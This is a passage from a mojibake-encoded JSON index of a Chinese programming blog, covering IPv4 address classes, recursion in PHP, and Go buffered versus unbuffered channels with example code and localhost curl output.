è¿˜æœ‰ô°€è¦ä¸€ç‚¹ï¼Œæ—…è¡Œé€”ä¸­æˆ‘ä»¬è™½ç„¶ä¸æ–­å˜åŒ–äº†äº¤é€šå·¥å…·ï¼Œä½†æ˜¯æ—…è¡Œè¡Œç¨‹çš„èµ·å§‹åœ°å€å’Œç›®çš„åœ°å€å§‹ç»ˆéƒ½æ²¡å˜ã€‚å…¶å®ï¼Œ åœ¨ç½‘ç»œä¸­æ•°æ®åŒ…ä¼ è¾“ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ï¼ŒæºIPåœ°å€å’Œç›®æ ‡IPåœ°å€åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šå˜åŒ–çš„ï¼Œåªæœ‰æº MAC åœ°å€å’Œç›®æ ‡ MAC ä¸€ç›´åœ¨å˜åŒ–ã€‚ IP åœ°å€åŸºç¡€çŸ¥è¯†åœ¨ TCP/IP ç½‘ç»œé€šä¿¡æ—¶ï¼Œä¸ºäº†ä¿è¯èƒ½æ­£å¸¸é€šä¿¡ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½éœ€è¦é…ç½®æ­£ç¡®çš„ IP åœ°å€ï¼Œå¦åˆ™æ— æ³•å®ç°æ­£å¸¸çš„é€šä¿¡ã€‚ IP åœ°å€(IPv4 åœ°å€)ç”± 32 ä½æ­£æ•´æ•°æ¥è¡¨ç¤ºï¼ŒIP åœ°å€åœ¨è®¡ç®—æœºæ˜¯ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼å¤„ç†çš„ã€‚ è€Œäººç±»ä¸ºäº†æ–¹ä¾¿è®°å¿†é‡‡ç”¨äº†ç‚¹åˆ†åè¿›åˆ¶çš„æ ‡è®°æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯å°† 32 ä½ IP åœ°å€ä»¥æ¯ 8 ä½ä¸ºç»„ï¼Œå…±åˆ†ä¸º 4 ç»„ï¼Œæ¯ç»„ä»¥ ã€Œ . ã€éš”å¼€ï¼Œå†å°†æ¯ç»„è½¬æ¢æˆåè¿›åˆ¶ã€‚ IP åœ°å€çš„åˆ†ç±»1. ç½‘ç»œåœ°å€IPåœ°å€ç”±ç½‘ç»œå·ï¼ˆåŒ…æ‹¬å­ç½‘å·ï¼‰å’Œä¸»æœºå·ç»„æˆï¼Œç½‘ç»œåœ°å€çš„ä¸»æœºå·ä¸ºå…¨0ï¼Œç½‘ç»œåœ°å€ä»£è¡¨ç€æ•´ä¸ªç½‘ç»œã€‚ 2. å¹¿æ’­åœ°å€å¹¿æ’­åœ°å€é€šå¸¸ç§°ä¸ºç›´æ¥å¹¿æ’­åœ°å€ï¼Œæ˜¯ä¸ºäº†åŒºåˆ†å—é™å¹¿æ’­åœ°å€ã€‚ å¹¿æ’­åœ°å€ä¸ç½‘ç»œåœ°å€çš„ä¸»æœºå·æ­£å¥½ç›¸åï¼Œå¹¿æ’­åœ°å€ä¸­ï¼Œä¸»æœºå·ä¸ºå…¨1ã€‚å½“å‘æŸä¸ªç½‘ç»œçš„å¹¿æ’­åœ°å€å‘é€æ¶ˆæ¯æ—¶ï¼Œè¯¥ç½‘ç»œå†…çš„æ‰€æœ‰ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¯¥å¹¿æ’­æ¶ˆæ¯ã€‚ 3. ç»„æ’­åœ°å€Dç±»åœ°å€å°±æ˜¯ç»„æ’­åœ°å€ã€‚ å…ˆå›å¿†ä¸‹Aï¼ŒBï¼ŒCï¼ŒDç±»åœ°å€å§ï¼š Aç±»åœ°å€ä»¥0å¼€å¤´ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä½œä¸ºç½‘ç»œå·ï¼Œåœ°å€èŒƒå›´ä¸ºï¼š0.0.0.0~127.255.255.255ï¼›(modified @2016.05.31) Bç±»åœ°å€ä»¥10å¼€å¤´ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚ä½œä¸ºç½‘ç»œå·ï¼Œåœ°å€èŒƒå›´æ˜¯ï¼š128.0.0.0~191.255.255.255; Cç±»åœ°å€ä»¥110å¼€å¤´ï¼Œå‰ä¸‰ä¸ªå­—èŠ‚ä½œä¸ºç½‘ç»œå·ï¼Œåœ°å€èŒƒå›´æ˜¯ï¼š192.0.0.0~223.255.255.255ã€‚ Dç±»åœ°å€ä»¥1110å¼€å¤´ï¼Œåœ°å€èŒƒå›´æ˜¯224.0.0.0~239.255.255.255ï¼ŒDç±»åœ°å€ä½œä¸ºç»„æ’­åœ°å€ï¼ˆä¸€å¯¹å¤šçš„é€šä¿¡ï¼‰ï¼› Eç±»åœ°å€ä»¥1111å¼€å¤´ï¼Œåœ°å€èŒƒå›´æ˜¯240.0.0.0~255.255.255.255ï¼ŒEç±»åœ°å€ä¸ºä¿ç•™åœ°å€ï¼Œä¾›ä»¥åä½¿ç”¨ã€‚ æ³¨ï¼šåªæœ‰Aã€Bã€C æœ‰ç½‘ç»œå·å’Œä¸»æœºå·ä¹‹åˆ†ï¼ŒDç±»åœ°å€å’ŒEç±»åœ°å€æ²¡æœ‰åˆ’åˆ†ç½‘ç»œå·å’Œä¸»æœºå·ã€‚ 4. 255.255.255.255è¯¥IPåœ°å€æŒ‡çš„æ˜¯å—é™çš„å¹¿æ’­åœ°å€ã€‚å—é™å¹¿æ’­åœ°å€ä¸ä¸€èˆ¬å¹¿æ’­åœ°å€ï¼ˆç›´æ¥å¹¿æ’­åœ°å€ï¼‰çš„åŒºåˆ«åœ¨äºï¼Œå—é™å¹¿æ’­åœ°å€åªèƒ½ç”¨äºæœ¬åœ°ç½‘ç»œï¼Œè·¯ç”±å™¨ä¸ä¼šè½¬å‘ä»¥å—é™å¹¿æ’­åœ°å€ä¸ºç›®çš„åœ°å€çš„åˆ†ç»„ï¼›ä¸€èˆ¬å¹¿æ’­åœ°å€æ—¢å¯åœ¨æœ¬åœ°å¹¿æ’­ï¼Œä¹Ÿå¯è·¨ç½‘æ®µå¹¿æ’­ã€‚ ä¾‹å¦‚ï¼šä¸»æœº192.168.1.1/30ä¸Šçš„ç›´æ¥å¹¿æ’­æ•°æ®åŒ…åï¼Œå¦å¤–ä¸€ä¸ªç½‘æ®µ192.168.1.5/30ä¹Ÿèƒ½æ”¶åˆ°è¯¥æ•°æ®æŠ¥ï¼›è‹¥å‘é€å—é™å¹¿æ’­æ•°æ®æŠ¥ï¼Œåˆ™ä¸èƒ½æ”¶åˆ°ã€‚ æ³¨ï¼šä¸€èˆ¬çš„å¹¿æ’­åœ°å€ï¼ˆç›´æ¥å¹¿æ’­åœ°å€ï¼‰èƒ½å¤Ÿé€šè¿‡æŸäº›è·¯ç”±å™¨ï¼ˆå½“ç„¶ä¸æ˜¯æ‰€æœ‰çš„è·¯ç”±å™¨ï¼‰ï¼Œè€Œå—é™çš„å¹¿æ’­åœ°å€ä¸èƒ½é€šè¿‡è·¯ç”±å™¨ã€‚ 5. 0.0.0.0å¸¸ç”¨äºå¯»æ‰¾è‡ªå·±çš„IPåœ°å€ï¼Œä¾‹å¦‚åœ¨æˆ‘ä»¬çš„RARPï¼ŒBOOTPå’ŒDHCPåè®®ä¸­ï¼Œè‹¥æŸä¸ªæœªçŸ¥IPåœ°å€çš„æ— ç›˜æœºæƒ³è¦çŸ¥é“è‡ªå·±çš„IPåœ°å€ï¼Œå®ƒå°±ä»¥255.255.255.255ä¸ºç›®çš„åœ°å€ï¼Œå‘æœ¬åœ°èŒƒå›´ï¼ˆå…·ä½“è€Œè¨€æ˜¯è¢«å„ä¸ªè·¯ç”±å™¨å±è”½çš„èŒƒå›´å†…ï¼‰çš„æœåŠ¡å™¨å‘é€IPè¯·æ±‚åˆ†ç»„ã€‚ 6. å›ç¯åœ°å€127.0.0.0/8è¢«ç”¨ä½œå›ç¯åœ°å€ï¼Œå›ç¯åœ°å€è¡¨ç¤ºæœ¬æœºçš„åœ°å€ï¼Œå¸¸ç”¨äºå¯¹æœ¬æœºçš„æµ‹è¯•ï¼Œç”¨çš„æœ€å¤šçš„æ˜¯127.0.0.1ã€‚ 7. Aã€Bã€Cç±»ç§æœ‰åœ°å€ç§æœ‰åœ°å€(private address)ä¹Ÿå«ä¸“ç”¨åœ°å€ï¼Œå®ƒä»¬ä¸ä¼šåœ¨å…¨çƒä½¿ç”¨ï¼Œåªå…·æœ‰æœ¬åœ°æ„ä¹‰ï¼š Aç±»ç§æœ‰åœ°å€ï¼š10.0.0.0/8ï¼ŒèŒƒå›´æ˜¯ï¼š10.0.0.0~10.255.255.255 Bç±»ç§æœ‰åœ°å€ï¼š172.16.0.0/12ï¼ŒèŒƒå›´æ˜¯ï¼š172.16.0.0~172.31.255.255 Cç±»ç§æœ‰åœ°å€ï¼š192.168.0.0/16ï¼ŒèŒƒå›´æ˜¯ï¼š192.168.0.0~192.168.255.255 å‚è€ƒé“¾æ¥ å›¾è§£ç½‘ç»œâ€”â€”å°æ—coding","categories":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"è®¡ç®—æœºç½‘ç»œ","slug":"è®¡ç®—æœºç½‘ç»œ","permalink":"https://www.0x2beace.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"ç®—æ³•å­¦ä¹ ç¬”è®°â€”â€”é€’å½’","slug":"algorithm-learning-recursion","date":"2022-11-18T04:19:10.000Z","updated":"2023-02-18T03:28:33.573Z","comments":true,"path":"algorithm-learning-recursion/","link":"","permalink":"https://www.0x2beace.com/algorithm-learning-recursion/","excerpt":"ç®—æ³•å­¦ä¹ ç¬”è®°â€”â€”é€’å½’","text":"ç®—æ³•å­¦ä¹ ç¬”è®°â€”â€”é€’å½’ é€’å½’æ¯ä¸ªé€’å½’å‡½æ•°éƒ½è¦æœ‰ä¸¤éƒ¨åˆ†ï¼š åŸºçº¿æ¡ä»¶ï¼šé€’å½’çš„ç»“æŸæ¡ä»¶ï¼Œä»è€Œé¿å…å½¢æˆæ— é™å¾ªç¯ é€’å½’æ¡ä»¶ï¼šå‡½æ•°è°ƒç”¨è‡ªå·± ä¸‹é¢ç»“åˆä¸€ä¸ªå®é™…çš„ä¾‹å­æ¥ç†è§£ï¼š 12345678910function fib($n)&#123; if ($n &lt;= 2) &#123; // åŸºçº¿æ¡ä»¶ return $n; &#125; // é€’å½’æ¡ä»¶ return fib($n-1) + fib($n - 2);&#125; å¦‚ä½•å†™å¥½ä¸€ä¸ªé€’å½’ï¼Œè¦å¤šå»æ€è€ƒä¸Šé¢çš„ä¸¤ä¸ªæ¡ä»¶åº”è¯¥æ€ä¹ˆå†™ã€‚ è°ƒç”¨æ ˆæ ˆæ˜¯ä¸€ç§ç®€å•çš„æ•°æ®ç»“æ„ï¼Œåœ¨ä½¿ç”¨é€’å½’æ—¶ï¼Œç”¨åˆ°äº†è°ƒç”¨æ ˆã€‚ ç”¨äºå­˜å‚¨å¤šä¸ªå‡½æ•°çš„å˜é‡çš„æ ˆï¼Œè¢«ç§°ä¸ºè°ƒç”¨æ ˆã€‚ æ¯å½“è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè®¡ç®—æœºä¼šå°†å‡½æ•°è°ƒç”¨æ‰€æ¶‰åŠçš„æ‰€æœ‰å˜é‡çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ï¼Œå¦‚æœæ­¤æ—¶ï¼Œå†æ¬¡è°ƒç”¨äº†å¦ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè®¡ç®—æœºä¹Ÿä¼šä¸ºè¿™ä¸ªå‡½æ•°è°ƒç”¨åˆ†é…ä¸€å—å†…å­˜ã€‚ è®¡ç®—æœºä½¿ç”¨ä¸€ä¸ªæ ˆæ¥è¡¨ç¤ºè¿™äº›å†…å­˜å—ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå†…å­˜å—ä½äºç¬¬ä¸€ä¸ªå†…å­˜å—ä¸Šé¢ã€‚å¦‚æœå‡½æ•°è°ƒç”¨è¿”å›ï¼Œæ­¤æ—¶ï¼Œæ ˆé¡¶çš„å†…å­˜å—å°±ä¼šè¢«å¼¹å‡ºã€‚ ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥è§£é‡Šè°ƒç”¨æ ˆçš„è¿‡ç¨‹ï¼š ä½¿ç”¨æ ˆè™½ç„¶å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿè¦ä»˜å‡ºä»£ä»·ï¼šå­˜å‚¨è°ƒç”¨æ ˆçš„è¯¦å°½ä¿¡æ¯éœ€è¦å ç”¨å¤§é‡çš„å†…å­˜ã€‚å› ä¸ºæ¯ä¸ªå‡½æ•°è°ƒç”¨éƒ½éœ€è¦å ç”¨ä¸€å®šçš„å†…å­˜ï¼Œå¦‚æœæ ˆå¾ˆé«˜ï¼Œå°±æ„å‘³ç€è®¡ç®—æœºå­˜å‚¨äº†å¤§é‡å‡½æ•°è°ƒç”¨çš„ä¿¡æ¯ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±ä¸å»ºè®®ç»§ç»­ä½¿ç”¨é€’å½’äº†ï¼Œæœ‰ä¸¤ç§é€‰æ‹©ï¼š ä½¿ç”¨å¾ªç¯ ä½¿ç”¨å°¾é€’å½’ ä¾‹å¦‚ Leetcode çš„ç¬¬70é¢˜ï¼Œæ—¢å¯ä»¥ç”¨é€’å½’è§£å†³ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¾ªç¯ï¼ˆåŠ¨æ€è§„åˆ’ï¼‰è§£å†³ï¼Œä½†æ˜¯å‰è€…åœ¨è¾¾åˆ°ä¸€å®šæ·±åº¦ä¹‹åï¼Œæ‰§è¡Œæ—¶é—´å°±ä¼šå˜å¾—å¾ˆé•¿ã€‚","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å¦‚ä½•ç†è§£ channel çš„æ— ç¼“å†²å¸¦å’Œæœ‰ç¼“å†²å¸¦","slug":"go-language-study-notes-how-to-understand-the-channel-without-buffer-and-with-buffer","date":"2022-11-11T13:44:51.000Z","updated":"2023-02-18T03:28:33.589Z","comments":true,"path":"go-language-study-notes-how-to-understand-the-channel-without-buffer-and-with-buffer/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-how-to-understand-the-channel-without-buffer-and-with-buffer/","excerpt":"channel æ˜¯å¦æœ‰ç¼“å†²å¸¦ï¼Œå…¶è¡Œä¸ºä¼šæœ‰ä¸€äº›ä¸åŒã€‚ç†è§£è¿™ä¸ªå·®å¼‚å¯¹å†³å®šåˆ°åº•åº”è¯¥ä½¿ä¸ä½¿ç”¨ç¼“å†²å¸¦å¾ˆæœ‰å¸®åŠ©ã€‚","text":"channel æ˜¯å¦æœ‰ç¼“å†²å¸¦ï¼Œå…¶è¡Œä¸ºä¼šæœ‰ä¸€äº›ä¸åŒã€‚ç†è§£è¿™ä¸ªå·®å¼‚å¯¹å†³å®šåˆ°åº•åº”è¯¥ä½¿ä¸ä½¿ç”¨ç¼“å†²å¸¦å¾ˆæœ‰å¸®åŠ©ã€‚ ç†è§£æ— ç¼“å†²å¸¦ channelä½¿ç”¨æ— ç¼“å†²å¸¦ channel è¿›è¡Œæ¥æ”¶å’Œå‘é€æ“ä½œæ—¶ï¼Œä¸€å®šè¦æ³¨æ„ï¼Œæ¥æ”¶å’Œå‘é€æ“ä½œä¸èƒ½æ”¾åœ¨åŒä¸€ä¸ª goroutine ä¸­ï¼Œå¦åˆ™æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæ— ç¼“å†²å¸¦ channel çš„ç‰¹ç‚¹æ˜¯ï¼ŒåŒæ­¥é˜»å¡ã€‚ æ— ç¼“å†²å¸¦ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š ä»æ— ç¼“å†²å¸¦ channel æ¥æ”¶æ•°æ®æ—¶ï¼Œå¦‚æœåŒæ—¶æ²¡æœ‰å‘é€è€…å‘é€æ•°æ®ï¼Œé‚£ä¹ˆåˆ™ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æœ‰å‘é€è€…å‡ºç°è¿›è¡Œå‘é€ã€‚ å‘æ— ç¼“å†²å¸¦ channel å‘é€æ•°æ®ï¼Œå¦‚æœåŒæ—¶æ²¡æœ‰æ¥æ”¶è€…è¿›è¡Œæ¥æ”¶ï¼Œé‚£ä¹ˆåˆ™ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æœ‰æ¥æ”¶è€…å‡ºç°è¿›è¡Œæ¥æ”¶ã€‚ ç»“åˆä¸‹é¢è¿™ä¸ªå›¾è¿›è¡Œç†è§£ï¼Œä¹Ÿå°±æ˜¯æ— ç¼“å†²å¸¦ channel åªæœ‰åŒæ—¶å…·å¤‡æ¥æ”¶å’Œå‘é€èƒ½åŠ›æ‰ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ ç»“åˆä¸‹é¢çš„ç¤ºä¾‹ä»£ç æ¥ç†è§£ï¼š 1234567891011121314151617func main() &#123; // æ— ç¼“å†²å¸¦ ch1 := make(chan int) ch2 := make(chan int) ch1 = ch2 go func() &#123; fmt.Println(\"go\") ch2 &lt;- 123 i := &lt;-ch1 fmt.Println(i) &#125;() time.Sleep(10 * time.Second) fmt.Println(\"done\")&#125; ä¹Ÿå°±æ˜¯æ— è®º time.Sleep ä¼‘æ¯å¤šå°‘ç§’ï¼Œ goroutine ä¸­çš„ 123 éƒ½ä¸ä¼šæ‰“å°å‡ºæ¥ã€‚å› ä¸º goroutine é˜»å¡åœ¨ ch2 &lt;- 123 è¿™è¡Œä»£ç äº†ã€‚ é‚£ä¹ˆåº”è¯¥æ€ä¹ˆæ”¹å†™ï¼Œ 123 æ‰ä¼šæ‰“å°å‡ºæ¥å‘¢ï¼Ÿ åªéœ€è¦å°†å‘é€æ•°æ®è¿™ä¸€è¡Œä»£ç ç§»å‡º goroutine å³å¯ï¼š 123456789...go func() &#123; fmt.Println(\"go\") i := &lt;-ch1 fmt.Println(i)&#125;()ch2 &lt;- 123 è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123go123done ç¬¦åˆé¢„æœŸã€‚ ç†è§£æœ‰ç¼“å†²å¸¦ channelå¾ˆå¤šèµ„æ–™æˆ–è€…æ–‡ç« é‡Œé¢ä¼šè¯´ï¼Œæœ‰ç¼“å†²å¸¦ channel æ˜¯å¼‚æ­¥éé˜»å¡çš„ï¼Œè¿™ä¸ªå¼‚æ­¥åˆ°åº•è¯¥å¦‚ä½•ç†è§£å‘¢ï¼Ÿ æœ‰ç¼“å†²å¸¦ï¼Œå¯ä»¥åˆ†ä¸ºå››ç§æƒ…å†µï¼š å¦‚æœç¼“å†²å¸¦å·²æ»¡ï¼Œé‚£ä¹ˆå¯¹å®ƒçš„æ‰€æœ‰å‘é€æ“ä½œéƒ½ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°ç¼“å†²å¸¦ä¸­æœ‰å…ƒç´ å€¼è¢«æ¥æ”¶ å¦‚æœç¼“å†²å¸¦å·²ç©ºï¼Œé‚£ä¹ˆå¯¹å®ƒçš„æ‰€æœ‰æ¥æ”¶æ“ä½œéƒ½ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°é€šé“ä¸­æœ‰æ–°çš„å…ƒç´ å€¼å‡ºç° å¦‚æœç¼“å†²å¸¦æœªæ»¡ï¼Œé‚£ä¹ˆå¯¹å®ƒçš„æ‰€æœ‰å‘é€æ“ä½œéƒ½ä¸ä¼šé˜»å¡ å¦‚æœç¼“å†²å¸¦éç©ºï¼Œé‚£ä¹ˆå¯¹å®ƒçš„æ‰€æœ‰æ¥æ”¶æ“ä½œéƒ½ä¸ä¼šé˜»å¡ ä¸Šé¢æ‰€è¯´å¼‚æ­¥éé˜»å¡ï¼Œå°±æ˜¯é’ˆå¯¹ç¬¬ä¸‰å››ç§æƒ…å†µçš„ï¼Œè€Œç¬¬ä¸€äºŒç§æƒ…å†µï¼Œåœ¨ç¼“å†²å¸¦å·²æ»¡ã€å·²ç©ºæ—¶ï¼Œå°±å’Œæ— ç¼“å†²å¸¦ä¸€æ ·äº†ï¼Œå› æ­¤ä¹Ÿä¼šæ˜¯åŒæ­¥é˜»å¡çš„ã€‚ ä¸‹é¢ç”¨ä¸€æ®µç¤ºä¾‹ä»£ç æ¥åŠ æ·±ç†è§£ã€‚è¿˜æ˜¯ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œåªæ˜¯åˆå§‹åŒ– channel æ—¶ï¼Œä½¿ç”¨çš„æ˜¯æœ‰ç¼“å†²å¸¦çš„ channelã€‚ 12345678910111213141516func main() &#123; ch1 := make(chan int, 1) ch2 := make(chan int, 1) ch1 = ch2 go func() &#123; fmt.Println(\"go\") ch2 &lt;- 123 i := &lt;-ch1 fmt.Println(i) &#125;() time.Sleep(1 * time.Second) fmt.Println(\"done\")&#125; æ‰§è¡Œä¸€ä¸‹ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123go123done ä¸ºä»€ä¹ˆç°åœ¨å°±æ‰“å°å‡º 123 æ¥äº†ï¼Ÿæ­£æ˜¯å› ä¸ºæœ‰ç¼“å†²å¸¦çš„å­˜åœ¨ï¼Œæœ‰ç¼“å†²å¸¦ channel ä¸éœ€è¦åŒæ—¶å…·æœ‰æ¥æ”¶å’Œå‘é€èƒ½åŠ›ï¼Œæ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œæ•°æ®çš„å‘é€è€…å°†æ•°æ®æ”¾åœ¨ç¼“å†²å¸¦å³å¯ï¼Œè€Œæ— éœ€ç­‰å¾…æ•°æ®çš„æ¥æ”¶è€…å‡ºç°ã€‚ ç»“åˆä¸‹é¢è¿™ä¸ªå›¾è¿›è¡Œç†è§£ï¼š åœ¨è¿™ä¸ªè¿‡ç¨‹é‡Œé¢ï¼Œä¸¤ä¸ªæ“ä½œä¸æ˜¯åŒæ­¥çš„ï¼Œå› æ­¤å°±è¯´æœ‰ç¼“å†²å¸¦ channel æ˜¯å¼‚æ­¥éé˜»å¡ã€‚ è¿™ä¸¤ç§ç±»å‹çš„ç¼“å†²å¸¦ï¼Œå„è‡ªæœ‰å„è‡ªçš„ç‰¹ç‚¹ï¼Œæœ‰çš„åœºæ™¯ä»…é€‚åˆä½¿ç”¨æ— ç¼“å†²å¸¦ channelï¼Œæœ‰çš„åœºæ™¯åˆ™åªé€‚åˆä½¿ç”¨æœ‰ç¼“å†²å¸¦ channelï¼Œä¸è¿‡ï¼Œä¹Ÿæœ‰ä¸¤ç§ç¼“å†²å¸¦éƒ½å¯ä»¥ä½¿ç”¨çš„åœºæ™¯ã€‚ ä¸€ä¸ªç¤ºä¾‹ä¸‹é¢è¿™ä¸ªç¤ºä¾‹å°±æ˜¯ä¸¤ç§ç¼“å†²å¸¦éƒ½å¯ä»¥ä½¿ç”¨çš„åœºæ™¯ã€‚ å…ˆæ¥çœ‹çœ‹ç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920func hello(w http.ResponseWriter, req *http.Request) &#123; fmt.Fprintln(w, \"hello go\")&#125;func main() &#123; http.HandleFunc(\"/hello\", hello) keepPrinting() fmt.Println(\"App runs on port 9999.\") log.Fatal(http.ListenAndServe(\":9999\", nil))&#125;func keepPrinting() &#123; i := 0 for &#123; i++ log.Println(\"i = \", i) &#125;&#125; ä¸ºäº†æ–¹ä¾¿åé¢ goroutine çš„ä½¿ç”¨ï¼Œè¿™é‡Œå¯åŠ¨äº†ä¸€ä¸ª HTTP æœåŠ¡ã€‚ å‡½æ•° keepPrinting çš„ä½œç”¨å¾ˆç®€å•ï¼Œåœ¨ä¸€ä¸ªä¸ä¼šä¸»åŠ¨åœæ­¢çš„ for å¾ªç¯ä¸­ï¼Œä¸€ç›´æ‰“å°å˜é‡ i çš„å€¼ã€‚ è¿è¡Œè¿™æ®µç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ç»ˆç«¯ä¸€ç›´æœ‰è¾“å‡ºï¼š 1234567...2022/11/25 09:59:37 i = 2439792022/11/25 09:59:37 i = 2439802022/11/25 09:59:37 i = 2439812022/11/25 09:59:37 i = 2439822022/11/25 09:59:37 i = 243983... è¿™æ—¶ï¼Œè®¿é—®ä¸€ä¸‹åˆšåˆšå¯åŠ¨çš„ Web æœåŠ¡ï¼š 12$ curl -I http://localhost:9999/helloHTTP/1.1 502 Bad Gateway æ€ä¹ˆçŠ¶æ€ç æ˜¯ 502ï¼Œä¸æ˜¯ 200ï¼Ÿè¿™æ˜¯å› ä¸º main goroutine ä¸€ç›´åœ¨ for å¾ªç¯é‡Œé¢ï¼Œå°±æ²¡æœ‰å‡ºæ¥è¿‡ï¼Œæ‰€ä»¥æœåŠ¡å‹æ ¹å°±æ²¡æœ‰å¯åŠ¨ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•ï¼Œæ—¢å¯ä»¥ä¿è¯æœåŠ¡æ­£å¸¸å¯åŠ¨ï¼ŒåŒæ—¶åˆå¯ä»¥æ‰§è¡Œ keepPrinting å‡½æ•°ï¼Ÿ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œé‚£å°±æ˜¯â€œåˆ›å»ºâ€ä¸€ä¸ª goroutineï¼Œç”±è¿™ä¸ª goroutine å»æ‰§è¡Œ keepPrinting å‡½æ•°ã€‚ å› æ­¤ï¼Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç å°±å˜æˆäº†è¿™æ ·ï¼š 12345678func main() &#123; http.HandleFunc(\"/hello\", hello) go keepPrinting() fmt.Println(\"App runs on port 9999.\") log.Fatal(http.ListenAndServe(\":9999\", nil))&#125; è¿è¡Œæ›´æ–°ä¹‹åçš„ç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ç»ˆç«¯åŒæ ·ä¸€ç›´æœ‰è¾“å‡ºï¼š 1234567...2022/11/25 09:59:37 i = 2439792022/11/25 09:59:37 i = 2439802022/11/25 09:59:37 i = 2439812022/11/25 09:59:37 i = 2439822022/11/25 09:59:37 i = 243983... è®¿é—®ä¸€ä¸‹ Web æœåŠ¡ï¼š 12$ curl -I http://localhost:9999/helloHTTP/1.1 200 OK çŠ¶æ€ç æ˜¯ 200ï¼Œè¯´æ˜æœåŠ¡å·²ç»å¯åŠ¨äº†ã€‚ ç°åœ¨è™½ç„¶è¾¾åˆ°äº†ä¸Šé¢çš„é¢„æœŸç»“æœï¼Œä½†æ˜¯ç»ˆç«¯è¾“å‡ºçš„å†…å®¹å¤ªå¤šäº†ï¼Œå¯¼è‡´å…¶ä»–é‡è¦çš„å†…å®¹å®¹æ˜“ä¸€ä¸‹å­è¢«â€œå†²èµ°äº†â€ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•ï¼Œå¯ä»¥é™åˆ¶ä¸€ä¸‹è¾“å‡ºï¼Œåªåœ¨æœåŠ¡ç«¯æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå»æ‰“å°ã€‚ å½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå°±è¦å€ŸåŠ© channel äº†ã€‚ å¯¹ä¸Šé¢çš„ç¤ºä¾‹ä»£ç è¿›è¡Œæ”¹é€ ï¼š 1234567891011121314151617181920212223242526272829var ch chan stringfunc hello(w http.ResponseWriter, req *http.Request) &#123; ch &lt;- req.URL.Path fmt.Fprintln(w, \"hello go\")&#125;func main() &#123; // ä¸¤ç§éƒ½å¯ä»¥ä½¿ç”¨ // ch = make(chan string) ch = make(chan string, 1) http.HandleFunc(\"/hello\", hello) go keepPrinting() fmt.Println(\"App runs on port 9999.\") log.Fatal(http.ListenAndServe(\":9999\", nil))&#125;func keepPrinting() &#123; i := 0 for &#123; i++ log.Println(\"i = \", i) url := &lt;-ch log.Println(\"URL.Path = \", url) &#125;&#125; å†æ¬¡æ‰§è¡Œç¤ºä¾‹ä»£ç ï¼Œå¯åŠ¨ Web æœåŠ¡ï¼š 12App runs on port 9999.2022/11/25 10:55:22 i = 1 ç»ˆç«¯è®¿é—® Web æœåŠ¡ï¼š 12$ curl -I http://localhost:9999/helloHTTP/1.1 200 OK æ§åˆ¶å°ç»§ç»­è¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š 122022/11/25 10:55:56 URL.Path = /hello2022/11/25 10:55:56 i = 2 è¿™é‡Œè¿™ä¸ªç¤ºä¾‹ï¼Œæ— è®ºæ˜¯ä½¿ç”¨æ— ç¼“å†² channelè¿˜æ˜¯æœ‰ç¼“å†² channelï¼Œå…¶æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ã€‚ ä½¿ç”¨æ— ç¼“å†² channel æ—¶ï¼Œå¯¹æ— ç¼“å†² channel 